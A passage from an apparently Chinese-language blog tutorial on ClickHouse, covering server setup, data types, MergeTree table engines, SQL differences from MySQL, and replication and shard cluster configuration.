Documentation</a></p><p>user.xml配置文档：<a href="https://clickhouse.com/docs/en/operations/settings/settings/">Settings | ClickHouse Documentation</a></p><p>修改一个配置，使得其他ip地址也可以访问clickhouse服务器</p><pre><code class="shell">sudo vi /etc/clickhouse-server/config.xml# 将下面这个配置取消注释&lt;listen_host&gt;::&lt;/listen_host&gt;</code></pre><p><font color="Red">此外再把tcp_port端口改为9003，因为默认的9000端口很容易被其他应用使用，比如hadoop就使用了9000端口。此外用，clickhosue-client连接时用tcp连接，而使用其他连接，比如datagrip或java，都是用的http连接，注意端口的使用。</font></p><pre><code class="xml">&lt;tcp_port&gt;9003&lt;/tcp_port&gt;</code></pre><h3 id="5、简单使用"><a href="#5、简单使用" class="headerlink" title="5、简单使用"></a>5、简单使用</h3><pre><code class="shell"># 启动sudo clickhouse start# 查看服务器运行状态sudo clickhouse status# /var/run/clickhouse-server/clickhouse-server.pid file exists and contains pid = 7116.# The process with pid = 7116 is running.# 关闭sudo clickhouse stop# 重启sudo clickhouse restart# 常加-m参数，这样可以在sql语句中使用换行，否则要用分号分隔# -h参数为服务器host，默认是localhost# --port参数为tcp端口，默认是9000clickhouse-client -m -h myubuntu1 --port 9003</code></pre><p>clickhouse-client还有一个快捷方式的参数query：</p><pre><code class="shell">clickhouse-client -m -h 192.168.141.141 --port 9003 --query &quot;show databases;&quot;defaultsystem</code></pre><p>clickhouse语法比较像MySQL，在某些语法上clickhouse区分大小写，比如数据类型UInt、String，以及表引擎MergeTree等等。</p><pre><code class="sql">show databases;use default;show tables;create table test2(    id UInt32,    create_time Datetime default now(),    name String,    age UInt8,    money Decimal(24,6) TTL create_time + interval 10 SECOND)engine=MergeTreeprimary key(id)order by(id, name);</code></pre><p>使用shell命令快速写一个批量插入100万条数据sql文件。</p><pre><code class="shell">for i in &#123;1..1000&#125;; doecho -n &quot;insert into default.test2(id, name, age, money) values (1, &#39;小明&#39;, 14, 2000)&quot; &gt;&gt; test.sql;for j in &#123;1..1000&#125;; do echo -n &quot;,($&#123;i&#125;$&#123;j&#125;, &#39;小明$&#123;i&#125;$&#123;j&#125;&#39;, $&#123;i&#125;$&#123;j&#125;, $&#123;i&#125;$&#123;j&#125;2000)&quot; &gt;&gt; test.sql; done;echo &quot;;&quot; &gt;&gt; test.sql;done;</code></pre><p>执行sql文件（速度贼快）</p><pre><code class="shell">clickhouse-client -m -h 192.168.141.141 --port 9003 --multiquery &lt; ./test.sql</code></pre><p>执行几个group查询（速度贼快）</p><p><font color="Red">注意，这里substring也是按照字节数来算长度的。</font></p><pre><code class="sql">select substring(name, 1, 6), sum(age) from test2 group by substring(name, 1, 6);select substring(name, 7, 1), sum(age) from test2 group by substring(name, 7, 1);select id % 2 as flag, sum(age) from test2 group by (id % 2);</code></pre><h2 id="三、数据类型"><a href="#三、数据类型" class="headerlink" title="三、数据类型"></a>三、数据类型</h2><p>文档：<a href="https://clickhouse.com/docs/en/sql-reference/data-types/">Introduction | ClickHouse Documentation</a></p><h3 id="1、整形"><a href="#1、整形" class="headerlink" title="1、整形"></a>1、整形</h3><p>（1）有符号整型</p><table><thead><tr><th>clickhouse类型</th><th>范围</th><th>对应MySQL类型</th></tr></thead><tbody><tr><td>Int8</td><td>-128 : 127 (2^7)</td><td>tinyint</td></tr><tr><td>Int16</td><td>-32768 : 32767(2^15)</td><td>smallint</td></tr><tr><td>Int32</td><td>-2147483648 : 2147483647 (2^31)</td><td>int</td></tr><tr><td>Int64</td><td>-9223372036854775808 : 9223372036854775807 (2^63)</td><td>bigint</td></tr><tr><td>Int128</td><td>-2^127 : 2^127-1</td><td>无</td></tr><tr><td>Int256</td><td>-2^255 : 2^255-1</td><td>无</td></tr></tbody></table><p>（2）无符号整形</p><p>UInt8、UInt16、UInt32、UInt64，UInt128、UInt256，范围分别是0 : (2^n)-1。</p><p>128位和256位的一般用不到。</p><p>clickhouse没有布尔类型，官方建议用UInt8来存储，0代表false，1代表true。</p><h3 id="2、浮点型"><a href="#2、浮点型" class="headerlink" title="2、浮点型"></a>2、浮点型</h3><table><thead><tr><th>clichouse类型</th><th>对应MySQL类型</th></tr></thead><tbody><tr><td>Float32</td><td>float</td></tr><tr><td>Float64</td><td>double</td></tr></tbody></table><h3 id="3、Decimal"><a href="#3、Decimal" class="headerlink" title="3、Decimal"></a>3、Decimal</h3><table><thead><tr><th>clickhouse类型</th><th>整数位+小数位</th><th>小数位</th><th>对应MySQL类型</th></tr></thead><tbody><tr><td>Decimal(P,S)</td><td>P</td><td>S</td><td>decimal(P,S)</td></tr><tr><td>Decimal32(S)</td><td>9</td><td>S</td><td>decimal(9,S)</td></tr><tr><td>Decimal64(S)</td><td>18</td><td>S</td><td>decimal(18,S)</td></tr><tr><td>Decimal128(S)</td><td>38</td><td>S</td><td>decimal(38,S)</td></tr><tr><td>Decimal128(S)</td><td>76</td><td>S</td><td>decimal(76,S)</td></tr></tbody></table><p>不同位数长度的Decimal进行运算时，最终结果的位数长度是最大的那个。</p><h3 id="4、字符串类型"><a href="#4、字符串类型" class="headerlink" title="4、字符串类型"></a>4、字符串类型</h3><table><thead><tr><th>clickhouse</th><th>字节长度</th><th>对应MySQL类型</th></tr></thead><tbody><tr><td>String</td><td>无限制</td><td>varchar、所有text、所有blob</td></tr><tr><td>FixedString(N)</td><td>N</td><td>char(N)</td></tr></tbody></table><p>FixedString(N)类型，<font color="Red">这个N是字节长度，而不是字符长度</font>。当存入字符的字节长度小于N时，会用空字节（<code>\0</code>）补齐。一般很少用FixedString(N)，就像MySQL很少使用char(N)一样。</p><p><font color="Red">clickhouse没有编码的概念，即它存储字符串时是以二进制的形式存储。clickhosue在计算长度时，length函数是计算编码后字节的长度，lengthUTF8函数才是计算字符的长度，且只有一个计算UTF8编码的函数，因此服务器一定要使用utf-8编码。</font></p><p>clickhouse还有一个专门的存储UUID的类型：<strong>UUID</strong>，以及生成UUID的函数<code>generateUUIDv4()</code>。</p><pre><code class="sql">CREATE TABLE t_uuid (x UUID, y String) ENGINE=TinyLog</code></pre><h3 id="5、日期类型"><a href="#5、日期类型" class="headerlink" title="5、日期类型"></a>5、日期类型</h3><table><thead><tr><th>clickhouse类型</th><th>字节长度</th><th>时间范围</th><th>对应MySQL类型</th></tr></thead><tbody><tr><td>Date</td><td>2</td><td>1970-01-01至2148-12-31</td><td></td></tr><tr><td>Date32</td><td></td><td>1925-01-01至2283-11-11</td><td></td></tr><tr><td>DateTime([timezone])</td><td></td><td>1970-01-01 00:00:00至2105-12-31 23:59:59</td><td>timestamp</td></tr><tr><td>DateTime64(precision, [timezone])</td><td></td><td>1925-01-01 00:00:00至2283-11-11 23:59:59</td><td></td></tr><tr><td>Interval</td><td></td><td>无，是一个时间长度含义</td><td>interval</td></tr></tbody></table><p>timezone是指时区，默认使用配置文件中设置的时区，或者操作系统时区。</p><p>precision是指秒后面的时间精度。</p><p>Interval的使用和MySQL的interval类型一样使用。</p><pre><code class="sql">select now() + interval 4 DAY + interval 3 HOUR;┌─plus(plus(now(), toIntervalDay(4)), toIntervalHour(3))─┐│                                    2021-11-26 01:15:52 │└────────────────────────────────────────────────────────┘</code></pre><h3 id="6、枚举类型"><a href="#6、枚举类型" class="headerlink" title="6、枚举类型"></a>6、枚举类型</h3><table><thead><tr><th>clickhouse类型</th><th>枚举值个数</th><th>MySQL类型</th></tr></thead><tbody><tr><td>Enum8（别名：Enum）</td><td>256</td><td>enum</td></tr><tr><td>Enum16</td><td>65536</td><td>enum</td></tr></tbody></table><pre><code class="sql">CREATE TABLE t_enum(    x Enum(&#39;hello&#39; = 1, &#39;world&#39; = 2))ENGINE = TinyLog</code></pre><p>clickhouse和MySQL在存储枚举值时，都是存储的对应的数值，而clickhouse是手动设置枚举值对应的数字值，MySQL则是系统设定的。</p><h3 id="7、LowCardinality"><a href="#7、LowCardinality" class="headerlink" title="7、LowCardinality"></a>7、LowCardinality</h3><pre><code>LowCardinality(data_type)</code></pre><p>该数据类型，将存储的值，设置字典索引，实际存储则存储其索引数字即可。</p><p>比如LowCardinality(String)类型字段，在insert了“小明”，“小红”，“小光”三个字符时，首先会创建一个字典，将这三个字符写入字典，如下：</p><pre><code class="java">&#123;    1: &quot;小明&quot;,    2: &quot;小红&quot;,    3: &quot;小光&quot;,&#125;</code></pre><p>key为索引序号，value为实际值。而实际存储在数据文件中，则是存储的其索引。</p><p><font color="Red">当value有很多重复值时，这种方式不仅可以节省很多存储空间，还可以加快读取速度，以及对该字段进行过滤、分组和某些查询的速度。</font></p><p><strong>值得一提的是，微软office2007版本的xlsx类型文件底层的字符串格式的存储也是采用这种方式，专门使用一个sharedString.xml来存储所有字符串，作为一个字典，而在主体的存储文件中使用索引。</strong></p><p>但是这种类型，写入速度会比一般普通类型写入慢一些，因此<strong>特别不建议在重复度很低的字段上使用这个类型</strong>。</p><p>这种类型和Enum比较类似，但是LowCadinality更加灵活，不仅可以存储String，还可以存储Date、DateTime，只要重复度很高，则可以使用这种类型。</p><h3 id="8、Nullable-T"><a href="#8、Nullable-T" class="headerlink" title="8、Nullable(T)"></a>8、Nullable(T)</h3><p>Nullable(T)，可为空的类型，如Nullable(Int8)是可为空值的Int8</p><p><font color="Red">使用Nullable会对性能产生影响，业务中可以用一些特殊字符或无意义的值来填充null，从而避免使用Nullable类型。</font></p><p>原因：1、Nullable会单独存一个文件；2、null无法使用索引。</p><p><font color="Red">注意：每种数据类型都会有自带的默认值，且不是null，如Int8的默认值是0，String的默认值是空字符串，DateTime的默认值是1970-01-01 08:00:00。如果需要为null，则需要使用Nullable(T)类型，Nullable的默认值则是null。</font></p><pre><code class="sql">use default;create table test1(a Int8, b String, c DateTime, d Nullable(Int8), e Nullable(String) , f Nullable(DateTime))engine=TinyLog;insert into test1 values(1, &#39;nihao&#39;, &#39;2020-12-31&#39;, 1, &#39;nihao&#39;, &#39;2020-12-31&#39;);insert into test1 values(null, null, null, null, null, null);select * from test1;┌─a─┬─b─────┬───────────────────c─┬────d─┬─e─────┬───────────────────f─┐│ 1 │ nihao │ 2020-12-31 00:00:00 │    1 │ nihao │ 2020-12-31 00:00:00 ││ 0 │       │ 1970-01-01 08:00:00 │ ᴺᵁᴸᴸ │ ᴺᵁᴸᴸ  │                ᴺᵁᴸᴸ │└───┴───────┴─────────────────────┴──────┴───────┴─────────────────────┘</code></pre><p>判断是否为null的格式如下，如果不是Nullable类型，则没有.null这个字段，会报错。</p><pre><code class="sql">select * from test1 where d.null = 1;┌─a─┬─b─┬───────────────────c─┬────d─┬─e────┬────f─┐│ 0 │   │ 1970-01-01 08:00:00 │ ᴺᵁᴸᴸ │ ᴺᵁᴸᴸ │ ᴺᵁᴸᴸ │└───┴───┴─────────────────────┴──────┴──────┴──────┘</code></pre><h3 id="9、其他类型"><a href="#9、其他类型" class="headerlink" title="9、其他类型"></a>9、其他类型</h3><p>Array(T)，数组</p><p>AggregateFunction和SimpleAggregateFunction，比较重要，可以在表引擎那里再理解</p><p>Nested，类似于c++的struct</p><p>Tuple，即可以存不同数据类型的Array</p><p>Expression，存储了lamdba表达式</p><p>Set，集合，不可重复</p><p>Nothing，官方解释，此数据类型的唯一目的是表示不需要值的情况，好像没啥用</p><p>IPV4，ipv4专用类型，基于UInt32存储</p><p>IPV6，ipv6专用类型</p><p>GEO，坐标类型，包括Point、Ring、Polygon、MultiPolygon</p><p>Map(K, V)，映射表类型</p><h3 id="10、特殊值"><a href="#10、特殊值" class="headerlink" title="10、特殊值"></a>10、特殊值</h3><p>此外clickhouse还有一些特殊值，如<code>Inf</code>、<code>-Inf</code>和<code>NaN</code>，即<code>infinity</code>、<code>negative infinity</code>和非数字类型。</p><pre><code class="sql">select 1 / 0 as a, -1 / 0 as b, 0 / 0 as c;┌───a─┬────b─┬───c─┐│ inf │ -inf │ nan │└─────┴──────┴─────┘</code></pre><h3 id="11、相关函数"><a href="#11、相关函数" class="headerlink" title="11、相关函数"></a>11、相关函数</h3><table><thead><tr><th>函数名</th><th>含义</th></tr></thead><tbody><tr><td>toTypeName(field)</td><td>获field字段的类型</td></tr><tr><td>cast(value, T) or cast(value as T)</td><td>将value强制转换为T类型</td></tr><tr><td>extract(part from date)</td><td>从日期中获取年、月、日</td></tr><tr><td>uniq(field)</td><td>取distinct</td></tr></tbody></table><pre><code class="sql">select cast(&#39;1&#39;, &#39;Int8&#39;) as x, toTypeName(x) as type;┌─x─┬─type─┐│ 1 │ Int8 │└───┴──────┘select extract(DAY from now());┌─toDayOfMonth(now())─┐│                  21 │└─────────────────────┘</code></pre><h2 id="四、表引擎"><a href="#四、表引擎" class="headerlink" title="四、表引擎"></a>四、表引擎</h2><p>文档：<a href="https://clickhouse.com/docs/en/engines/table-engines/">Introduction | ClickHouse Documentation</a></p><p>表引擎决定了：</p><ul><li>数据存储的方式和位置，写到哪里以及从哪里读取数据</li><li>支持哪些查询，以及如何支持（有一些特殊的查询需要特殊的表引擎才能支持）</li><li>并发数据访问</li><li>索引的使用</li><li>是否可以使用多线程执行（有些引擎，在查询一条sql时会多线程执行）</li><li>数据复制参数</li></ul><p>表引擎有<strong>集成引擎、日志系列引擎、MergeTree系列引擎和一些特殊引擎</strong>。</p><h3 id="1、集成引擎"><a href="#1、集成引擎" class="headerlink" title="1、集成引擎"></a>1、集成引擎</h3><p>集成引擎主要是为了继承其他组件而使用的，比如集成MySQL、jdbc、kafka等。集成的本质就是，将MySQL等源数据和clickhouse表做<strong>一层映射</strong>，然后就可以直接用clickhouse查询源数据。</p><h3 id="2、日志系列引擎"><a href="#2、日志系列引擎" class="headerlink" title="2、日志系列引擎"></a>2、日志系列引擎</h3><p>日志引擎是为了需要快速写一些小表（小于100万）而使用的引擎，就像名字一样，多用于日志存储。</p><p>如TinyLog，以列文件的形式保存在磁盘上，<strong>不支持索引，没有并发控制</strong>。一般保存少量数据，生产环境很少使用。</p><h3 id="3、特殊引擎"><a href="#3、特殊引擎" class="headerlink" title="3、特殊引擎"></a>3、特殊引擎</h3><p>很多，具体见官方文档。</p><p>如Memory，内存引擎，将数据以未经压缩的形式直接存储在内存中，<strong>不支持索引，读写操作不会阻塞，简单查询性能非常高</strong>！</p><h3 id="4、MergeTree系列（重要！！）"><a href="#4、MergeTree系列（重要！！）" class="headerlink" title="4、MergeTree系列（重要！！）"></a>4、MergeTree系列（重要！！）</h3><p>文档：<a href="https://clickhouse.com/docs/en/engines/table-engines/mergetree-family/">Introduction | ClickHouse Documentation</a></p><h4 id="（1）MergeTree合并树"><a href="#（1）MergeTree合并树" class="headerlink" title="（1）MergeTree合并树"></a>（1）MergeTree合并树</h4><p>这种表引擎在建表时，必须要加order by。</p><pre><code class="sql">CREATE TABLE [IF NOT EXISTS] [db.]table_name [ON CLUSTER cluster](    name1 [type1] [DEFAULT|MATERIALIZED|ALIAS expr1] [TTL expr1],    name2 [type2] [DEFAULT|MATERIALIZED|ALIAS expr2] [TTL expr2],    ...    INDEX index_name1 expr1 TYPE type1(...) GRANULARITY value1,    INDEX index_name2 expr2 TYPE type2(...) GRANULARITY value2,    ...    PROJECTION projection_name_1 (SELECT &lt;COLUMN LIST EXPR&gt; [GROUP BY] [ORDER BY]),    PROJECTION projection_name_2 (SELECT &lt;COLUMN LIST EXPR&gt; [GROUP BY] [ORDER BY])) ENGINE = MergeTree()ORDER BY expr[PARTITION BY expr][PRIMARY KEY expr][SAMPLE BY expr][TTL expr    [DELETE|TO DISK &#39;xxx&#39;|TO VOLUME &#39;xxx&#39; [, ...] ]    [WHERE conditions]    [GROUP BY key_expr [SET v1 = aggr_func(v1) [, v2 = aggr_func(v2) ...]] ] ][SETTINGS name=value, ...]</code></pre><p><strong>表底层存储文件夹和文件介绍：</strong></p><p><font color="Red">分区是按文件夹存储的，一个分区一个文件夹</font>，文件夹的名称为<code>分区id_最小分区块编号_最大分区块编号_合并层级</code></p><p>分区id生成规则：</p><ul><li>没有设置分区，则默认生成一个all目录作为数据分区</li><li>整形分区，以该整形值的字符串形式作为分区id</li><li>日期分区，分区id为日期的yyyymmdd形式</li><li>其他分区，如String、Float等，以其128位hash值为分区id</li></ul><p>最小分区块编号：分区的最小分区编号，适用于分区合并</p><p>最大分区块编号：分区的最大分区编号，适用于分区合并</p><p>合并层级：被合并的次数。<font color="Red">插入数据时，并不会直接将数据插入到对应分区中，而是会生成一个临时分区，等服务器空闲或者一段时间后，再将临时分区合并到原有的分区文件中。和hbase的regionserver类似</font></p><p><strong>通过手动执行<code>optimize table xxx final</code>可以手动进行数据合并。</strong></p><p><strong>目录文件内各文件介绍：</strong></p><ul><li>bin文件：数据文件</li><li>mrk文件：标记文件，标记文件在idx索引文件和bin文件之间起到了桥梁作用，一般记录列的offset，用于加速查询。以mrk2结尾的文件，表示该表启动了自适应索引间隔。</li><li>primary.idx文件：主键索引文件，用于加快查询效率</li><li>minmax_create_time.idx：分区键的最大值最小值</li><li>checksum.txt：校验文件，用于校验各个文件的正确性。存放各个文件的size和hash值。</li><li>count.txt：记录了该表的总数据量</li><li>columns.txt：记录了该表的列信息</li><li>default_compression_codec.txt：记录了数据文件中使用的压缩编码器</li><li>partition.dat：记录了分区信息</li></ul><p><strong>主键索引</strong></p><p>clickhouse的主键索引<strong>并不是唯一索引。主键索引是稀疏索引</strong>，即并不是将这一列的所有值建索引，而是一部分值，查找时通过类似于二分查找的方式确定数据所在区间，再扫描这个区间找到对应的值。</p><p>索引有一个index granularity，即索引稀疏粒度，即稀疏索引记录值时每次跳过的行数，默认值为8192。粒度越细，索引数据量存储的越大，查询效率越高；粒度越粗，索引数据量越小，查询效率越低。当很多重复值时，需要适当提高粒度。</p><p><strong>order by（MergeTree系列引擎最重要的字段）</strong></p><p>主键索引是稀疏索引，这种索引的查找方式需要排序，因此表必须有一个字段进行了排序，这就是为什么order by是MergeTree引擎的必选信息。<font color="Red">主键字段必须是order by的前缀字段</font>，原因和MySQL可以使用最左前缀字段作为索引原因一样。</p><p><strong>二级索引（数据跳跃索引）</strong></p><p>老版本需要设置<code>set allow_experimental_data_skipping_indices = 1</code>开启。</p><p>v20.1.2.4及以后，这个参数已经被删除了</p><p>二级索引的原理：以索引粒度为单位，记录每个区间的最大值和最小值，当以这个字段为条件查询时，只需要比较值是否落在这个区间就行（比较两次），若落在这个区间内，再做区间扫描，否则直接跳过。</p><p><strong>TTL</strong></p><p>数据过期时间，用于管理该数据的生命周期，到期删除。</p><p>有字段级别的TTL和表级别的TTL。字段级别只是删除这一个字段，表级别是删除整行数据。</p><h4 id="（2）ReplacingMergeTree"><a href="#（2）ReplacingMergeTree" class="headerlink" title="（2）ReplacingMergeTree"></a>（2）ReplacingMergeTree</h4><pre><code class="sql">CREATE TABLE [IF NOT EXISTS] [db.]table_name [ON CLUSTER cluster](    name1 [type1] [DEFAULT|MATERIALIZED|ALIAS expr1],    name2 [type2] [DEFAULT|MATERIALIZED|ALIAS expr2],    ...) ENGINE = ReplacingMergeTree([ver])[PARTITION BY expr][ORDER BY expr][PRIMARY KEY expr][SAMPLE BY expr][SETTINGS name=value, ...]</code></pre><p>完全继承了MergeTree，只是多了一个<strong>去重功能，根据order by字段进行去重</strong>。</p><p>去重要删除哪些数据：<font color="Red">建表语句中ReplacingMergeTree([ver])的ver字段值最大的那一条数据被保留，其他数据被删除。没指定这个字段，则按插入顺序来，保留最后的一条数据，类似于<code>upsert</code>。</font></p><p>去重时机：并不是实时去重，而是在合并分区时进行去重，即保证<strong>最终一致性</strong>。</p><p>去重范围：在同一分区内去重，并不是全表内去重。</p><p><strong>这个引擎在实际生产环境中最常用</strong>，通常ver字段都是业务中的插入时间字段，或者其他数据版本控制字段。</p><p>示例：</p><pre><code class="sql">CREATE TABLE default.test3(    `id` UInt32,    `name` String,    `money` Decimal(18, 6))ENGINE = ReplacingMergeTreeORDER BY (id, name)SETTINGS index_granularity = 8192;insert into test3 values (1, &#39;小明&#39;, 1000);insert into test3 values (1, &#39;小明&#39;, 2000);optimize table test3;select * from test3;</code></pre><h4 id="（3）SummingMergeTree"><a href="#（3）SummingMergeTree" class="headerlink" title="（3）SummingMergeTree"></a>（3）SummingMergeTree</h4><pre><code class="sql">CREATE TABLE [IF NOT EXISTS] [db.]table_name [ON CLUSTER cluster](    name1 [type1] [DEFAULT|MATERIALIZED|ALIAS expr1],    name2 [type2] [DEFAULT|MATERIALIZED|ALIAS expr2],    ...) ENGINE = SummingMergeTree([columns])[PARTITION BY expr][ORDER BY expr][SAMPLE BY expr][SETTINGS name=value, ...]</code></pre><p>在MergeTree的基础上，提供了“<strong>预聚合</strong>”的功能，且<strong>根据order by字段进行sum聚合</strong>。</p><p>聚合后其他字段怎么办：对columns字段进行sum，其他字段保留最早的那一条，即最早插入的那一条。</p><p>聚合范围：在同一分区内进行聚合。</p><p>聚合时机：并不是实时聚合，而是在合并分区时进行聚合。</p><h3 id="5、ReplacatedMergeTree系列"><a href="#5、ReplacatedMergeTree系列" class="headerlink" title="5、ReplacatedMergeTree系列"></a>5、ReplacatedMergeTree系列</h3><p>该系列表引擎用于副本备份，MergeTree系列的所有子引擎都有对应的ReplacetedMergeTree引擎，如ReplacetedReplacingMergeTree等。</p><h2 id="五、SQL语法"><a href="#五、SQL语法" class="headerlink" title="五、SQL语法"></a>五、SQL语法</h2><p>只介绍和标准sql不一样的地方</p><h3 id="1、Update和Delete"><a href="#1、Update和Delete" class="headerlink" title="1、Update和Delete"></a>1、Update和Delete</h3><p>clickhosue提供update和delete的功能，但没有这两个关键字，即不能直接使用delete或update语句，而是提供了一类称为Mutation的查询，是Alter的一种。</p><pre><code class="sql">-- 删除一条数据alter table test2 delete where id = 10000;-- 更新一条数据alter table test2 update age = 99 where id = 1;</code></pre><p>和普通的OLTP数据库不一样，Mutation语句是一种很重的操作，而且不支持事务。<font color="Red">原因在于每次操作都要放弃目标数据的原有分区，重新建分区，旧分区被打上逻辑上的失效标记，只有分区合并的时候，才会删除旧分区旧数据。因此要尽量做批量的变更，避免做频繁的小变更。</font></p><p>实现高性能的update和delete思路：</p><p>表结构额外新增两个字段：<code>isvalid</code>，0表示无效，1表示有效；<code>version</code>，表示数据版本号，最大为最新数据</p><p>更新：插入一条<code>version = max(version) + 1</code>的数据即可</p><p>删除：插入一条<code>isvalid = 0</code>的数据即可</p><p>查询：每次查询条件都要加上<code>version = max(version) and isvalid = 1</code></p><p>问题：数据膨胀，需要定期清理过期数据，并对数据分区做合并</p><h3 id="2、Join"><a href="#2、Join" class="headerlink" title="2、Join"></a>2、Join</h3><pre><code class="sql">select test2.id, sum(test3.money) from test2, test3 where test2.id = test3.id group by test2.id;</code></pre><p>clickhouse的join原理：将右表（test3）加载到内存中，再和左表一条一条匹配。</p><p><font color="Red">因此这里最好不要将大表写到右边</font>，这一点和MySQL的“小表驱动大表”不一样。</p><h3 id="3、函数"><a href="#3、函数" class="headerlink" title="3、函数"></a>3、函数</h3><p>窗口函数，21.7.3.14版本还处于实验中，需要使用的话，要将一个设置打开：</p><pre><code class="sql">set allow_experimental_window_functions = 1;</code></pre><p>自定义函数，不支持。</p><p>multiif(cond_1, then_1, cond_2, then_2, …)，类似于case when。</p><h3 id="4、group"><a href="#4、group" class="headerlink" title="4、group"></a>4、group</h3><p>group增加了with rollup、with cube、with totals用于统计不同维度的值。</p><pre><code class="sql">-- rollup是从右至左依次减少一个维度进行统计group A, B with rollup = group by A, Buniongroup by A, nulluniongroup by null, null-- cube是排列组合的维度统计group by A, B with cube =group by A, Buniongroup by A, nulluniongroup by B, nulluniongroup by null, null-- total是额外加上统计总计值group by A, B with totals =group by A, Buniongroup by null, null</code></pre><p>示例：</p><pre><code class="sql">select id % 2 as flag, substring(name, 7, 1) as flag2, sum(age) from test2 group by id % 2, substring(name, 7, 1) with rollup;select id % 2 as flag, substring(name, 7, 1) as flag2, sum(age) from test2 group by id % 2, substring(name, 7, 1) with cube;select id % 2 as flag, substring(name, 7, 1) as flag2, sum(age) from test2 group by id % 2, substring(name, 7, 1) with totals;</code></pre><h2 id="六、副本写入（备份、高可用）"><a href="#六、副本写入（备份、高可用）" class="headerlink" title="六、副本写入（备份、高可用）"></a>六、副本写入（备份、高可用）</h2><p>clickhouse副本类似于MySQL的replicate，备份用。对应的表引擎为ReplicatedMergeTree。</p><p>依赖zookeeper，没有主次之分。</p><p><img src="/images/%E5%89%AF%E6%9C%AC%E5%86%99%E5%85%A5.png"></p><p>配置的两种方式：</p><p>1、修改<code>/etc/clickhouse/config.xml</code>配置文件中的zookeeper配置</p><pre><code class="xml">    &lt;zookeeper&gt;        &lt;node&gt;            &lt;host&gt;example1&lt;/host&gt;            &lt;port&gt;2181&lt;/port&gt;        &lt;/node&gt;        &lt;node&gt;            &lt;host&gt;example2&lt;/host&gt;            &lt;port&gt;2181&lt;/port&gt;        &lt;/node&gt;        &lt;node&gt;            &lt;host&gt;example3&lt;/host&gt;            &lt;port&gt;2181&lt;/port&gt;        &lt;/node&gt;    &lt;/zookeeper&gt;</code></pre><p>2、在<code>/etc/clickhouse-server/config.d/</code>目录下新增一个<code>metrika.xml</code>文件，按照<code>config.xml</code>中zookeeper的配置样式写入自己的配置，再添加一个<code>include_from</code>标签和一个带有<code>incl</code>属性的<code>zookeeper</code>标签，引入这个配置文件。该文件的配置会覆盖<code>config.xml</code>中zookeeper的配置。</p><p>以这种方式创建xml文件不要忘了<font color="Red">用户权限</font>，将文件owner设置为clickhouse:clickhouse</p><pre><code class="shell">chown clickhouse:clickhouse metrika.xml</code></pre><pre><code class="xml">&lt;!-- metrika.xml --&gt;&lt;zookeeper&gt;    &lt;node&gt;        &lt;host&gt;example1&lt;/host&gt;        &lt;port&gt;2181&lt;/port&gt;    &lt;/node&gt;    &lt;node&gt;        &lt;host&gt;example2&lt;/host&gt;        &lt;port&gt;2181&lt;/port&gt;    &lt;/node&gt;    &lt;node&gt;        &lt;host&gt;example3&lt;/host&gt;        &lt;port&gt;2181&lt;/port&gt;    &lt;/node&gt;&lt;/zookeeper&gt;&lt;!-- config.xml --&gt;&lt;zookeeper incl=&quot;zookeeper-servers&quot; optional=&quot;true&quot;/&gt;&lt;include_from&gt;/etc/clickhouse-server/config.d/metrika.xml&lt;/include_from&gt;</code></pre><h2 id="七、分片集群"><a href="#七、分片集群" class="headerlink" title="七、分片集群"></a>七、分片集群</h2><p>副本是指备份，每个服务器都有全量数据（就像复制了一个服务器一样，所以叫replicate）。</p><p>分片集群是指分布式，将一份数据切片，分布到不同服务器上，每次查询需要将任务分发到各个服务器中，最后汇总结果（类似于map-reduce）。</p><p>分片集群对应的表引擎为Distributed。</p><h3 id="1、集群写入"><a href="#1、集群写入" class="headerlink" title="1、集群写入"></a>1、集群写入</h3><p>以3分片，2副本为例。</p><p><img src="/images/%E9%9B%86%E7%BE%A4%E5%86%99%E5%85%A5.png"></p><p>distribute hdp1类似于一个master（以下为了方便，简称为master），并不实际存储数据，而是起一个控制器和数据分发的作用。下面的hdp1-hdp6类似于worker，存储数据。客户端发送写入命令，master将接收到的数据发送给下面的worker写入数据。</p><p>问题：每个副本都要由master亲自分发数据吗？</p><p>internal_replication参数，</p><ul><li>true，表示master只将数据分发给分片，每个副本的数据写入有对应的分片进行内部复制</li><li>false，表示每个副本的数据写入也由master亲自分发，而不是由分片内部复制</li></ul><p>一般来说都会把这个参数设置为true，原因：</p><ul><li>副本服务器也要master来分发的话，会对master造成压力，写入效率会降低</li><li>对副本的分发过程中如果出现异常，则可能造成分片和对应的副本数据不一致</li><li>每一层只负责自己的事，master是为分布式而产生了，并不是为副本而产生的，因此master不太应该管副本的备份工作。</li></ul><h3 id="2、集群读取"><a href="#2、集群读取" class="headerlink" title="2、集群读取"></a>2、集群读取</h3><p><img src="/images/%E9%9B%86%E7%BE%A4%E8%AF%BB%E5%8F%96.png"></p><p>errors_count，即读取时发生错误的次数，每次发生错误会记录在对应的服务器中，读取时会选择错误次数更小的副本读取。</p><h3 id="3、配置"><a href="#3、配置" class="headerlink" title="3、配置"></a>3、配置</h3><p>同样可以将这个配置写在默认配置文件config.xml中，也可以在外部文件中加配置再在config.xml中引入。</p><p>在<code>/etc/clickhouse-server/config.xml</code>中加上</p><pre><code class="xml">&lt;include_from&gt;/etc/clickhouse-server/config.d/metrika-shard.xml&lt;/include_from&gt;</code></pre><p><code>/etc/clickhouse-server/config.d/metrika-shard.xml</code>配置如下：</p><p>注意同样别忘了文件的用户权限。</p><pre><code class="xml">&lt;remote_servers&gt;    &lt;perftest_1shards_3replicas&gt;&lt;!-- 集群名称，可以修改 --&gt;        &lt;shard&gt;            &lt;internal_replication&gt;true&lt;/internal_replication&gt;            &lt;replica&gt;                &lt;host&gt;example-perftest01j.yandex.ru&lt;/host&gt;                &lt;port&gt;9000&lt;/port&gt;             &lt;/replica&gt;             &lt;replica&gt;                &lt;host&gt;example-perftest02j.yandex.ru&lt;/host&gt;                &lt;port&gt;9000&lt;/port&gt;             &lt;/replica&gt;        &lt;/shard&gt;        &lt;shard&gt;            &lt;internal_replication&gt;true&lt;/internal_replication&gt;            &lt;replica&gt;                &lt;host&gt;example-perftest03j.yandex.ru&lt;/host&gt;                &lt;port&gt;9000&lt;/port&gt;             &lt;/replica&gt;             &lt;replica&gt;                &lt;host&gt;example-perftest04j.yandex.ru&lt;/host&gt;                &lt;port&gt;9000&lt;/port&gt;             &lt;/replica&gt;        &lt;/shard&gt;        &lt;shard&gt;            &lt;internal_replication&gt;true&lt;/internal_replication&gt;            &lt;replica&gt;                &lt;host&gt;example-perftest05j.yandex.ru&lt;/host&gt;                &lt;port&gt;9000&lt;/port&gt;             &lt;/replica&gt;             &lt;replica&gt;                &lt;host&gt;example-perftest06j.yandex.ru&lt;/host&gt;                &lt;port&gt;9000&lt;/port&gt;             &lt;/replica&gt;        &lt;/shard&gt;    